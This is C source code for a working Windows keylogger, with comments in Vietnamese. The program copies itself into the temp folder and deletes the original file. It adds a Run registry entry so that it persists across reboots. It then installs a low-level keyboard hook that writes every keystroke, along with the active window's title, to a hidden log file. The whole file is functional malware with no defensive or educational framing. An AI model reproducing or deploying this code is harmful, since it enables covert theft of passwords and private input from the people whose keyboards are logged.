
#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>


LRESULT CALLBACK MsgProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);


HANDLE g_hLogFile;
HANDLE g_hExeFile;
HANDLE g_hExeTempFile;
HWND g_hWActiveOld = 0, g_hWActiveNew;
HINSTANCE z;
//------------------Main
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    WCHAR TempPath[MAX_PATH] = { 0 }; // Đặt = {0} thì sizeof() +0, ngược lại sizeof() +1
    WCHAR LogPath[MAX_PATH] = { 0 };
    WCHAR ExePath[MAX_PATH] = { 0 };
    WCHAR ExeTempPath[MAX_PATH] = { 0 };
    WCHAR ExeDelPath[MAX_PATH] = { 0 };

    HANDLE hExeDel;
    
    GetTempPath(MAX_PATH, TempPath);

    lstrcat(LogPath, TempPath);
    lstrcat(LogPath, L"keylog.log");
    lstrcat(ExeTempPath, TempPath);
    lstrcat(ExeTempPath, L"keylog.exe");

    DWORD sizeRW = 0;

    int result=0;
    GetModuleFileNameW(0, ExePath, MAX_PATH); // Path exe ở hiện tại
    lstrcat(ExeDelPath, TempPath);
    lstrcat(ExeDelPath, L"delfile.log");
    // Tạo file để lưu link Exe bên ngoài temp
    // Check xem file exe có phải trong temp không, nếu không thì copy nó vào temp
    // Và tạo file log lưu link EXE cũ
    if (lstrcmp(ExePath, ExeTempPath) != 0) // Nếu không có trong Temp
    {
        //Và tạo file log lưu link EXE cũ
        result = CopyFile(ExePath, ExeTempPath, FALSE);
        hExeDel = CreateFile(ExeDelPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
        result = WriteFile(hExeDel, ExePath, sizeof(WCHAR) * (lstrlen(ExePath)), &sizeRW, 0);
        CloseHandle(hExeDel);
        
        z = ShellExecute(NULL, NULL, ExeTempPath, NULL, NULL, SW_SHOWDEFAULT);
        Sleep(100);
        return 0;
    }
    else // Có trong Temp
    {
        // Nếu Mở được file chưa link exe ra thì lặp xóa file rồi xóa file link đi
        if ((hExeDel = CreateFile(ExeDelPath, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_DELETE, 0, OPEN_EXISTING, 0, 0)) != INVALID_HANDLE_VALUE)
        {
           // đọc file log lấy link
            int Rresult = ReadFile(hExeDel, ExeDelPath, sizeof(ExeDelPath), &sizeRW, 0);
            CloseHandle(hExeDel);
            for (int i=0;i<2;i++)
            {
                if(DeleteFile(ExeDelPath) != 0) // Delete file Bên ngoài
                    break;
                Sleep(500);
            }
            
            // Khởi động cùng Windows
            HKEY hkey;
            RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
            int i = RegSetValueEx(hkey, L"Keylog", NULL, REG_SZ, (const BYTE*)ExeTempPath, lstrlen(ExeTempPath) * sizeof(WCHAR)+1);
            RegCloseKey(hkey);
            //  Mở File Log để Ghi
            g_hLogFile = CreateFile(LogPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
            HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)MsgProc, NULL, 0);// Bắt đầu HOOK
        }

    }
    
    //if ((hExeDel = CreateFile(ExeDelPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0)) != INVALID_HANDLE_VALUE)
    //{
    //    ZeroMemory(ExeDelPath, sizeof(ExeDelPath));
    //    result = ReadFile(hExeDel, ExeDelPath, sizeof(ExeDelPath), &sizeRW, 0);
    //}

     // Create Log File


    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}

//-----------------ProcWindow
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{

    return DefWindowProc(hwnd, uMsg, wParam, lParam);

}


LRESULT CALLBACK MsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT* KeyStruct = (KBDLLHOOKSTRUCT*)lParam;
    
    WCHAR namekey[65];
    WCHAR NameWindow[255];
    DWORD sizewrited = 0;
    int result;
    WCHAR EnterChar[2] = L"\n";
    switch (wParam)
    {
    case WM_KEYDOWN:
    {
        g_hWActiveNew = GetForegroundWindow();
        if (g_hWActiveNew != g_hWActiveOld)
        {
            ZeroMemory(NameWindow, sizeof(NameWindow));
            g_hWActiveOld = g_hWActiveNew;
            result = WriteFile(g_hLogFile, &EnterChar, sizeof(WCHAR) * (lstrlen(EnterChar)), &sizewrited, 0);
            GetWindowTextW(g_hWActiveNew, NameWindow, sizeof(NameWindow)/2);
            lstrcat(NameWindow, L":");
            result = WriteFile(g_hLogFile, &NameWindow, sizeof(WCHAR) * (lstrlen(NameWindow)), &sizewrited, 0);
        }
        ZeroMemory(namekey, sizeof(namekey));
        result = GetKeyNameTextW(KeyStruct->scanCode << 16, (LPWSTR)namekey, 65);
        lstrcat(namekey, L" ");
        result = WriteFile(g_hLogFile, &namekey,sizeof(WCHAR) * (lstrlen(namekey)), &sizewrited,0 );
        break;
    }
    default:
        break;
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}

//// Mở file exe hiện tại và copy vào temp
//// HANDLE TempFile Set chế độ Write
//g_hExeTempFile = CreateFile(ExeTempPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, 0);
//// HANDLE exe current Set chế độ đọc
//g_hExeFile = CreateFile(ExePath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, 0);
//int result = ReadFile(g_hExeFile,)